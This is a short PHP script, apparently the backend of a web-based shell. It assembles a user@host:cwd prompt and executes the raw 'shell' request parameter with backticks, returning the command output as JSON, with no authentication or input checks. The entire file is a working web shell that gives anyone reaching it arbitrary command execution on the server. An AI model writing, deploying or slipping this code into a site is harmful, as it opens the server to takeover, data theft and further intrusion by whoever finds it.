<?php

// assemble the prompt context
$whoami          =  trim(`whoami`);
$cwd             =  trim(`pwd`);
$hostname        =  trim(`hostname`);
$line_terminator =  ($whoami ===  'root') ? '#' : '$' ;
$prompt_context  =  "{$whoami}@{$hostname}:$cwd{$line_terminator}";

// generate the output
$output          = `{$_REQUEST['shell']}`;

$response = array(
    'prompt_context' => $prompt_context,
    'output'         => $output,
);

$json = json_encode($response);
echo $json;

die();
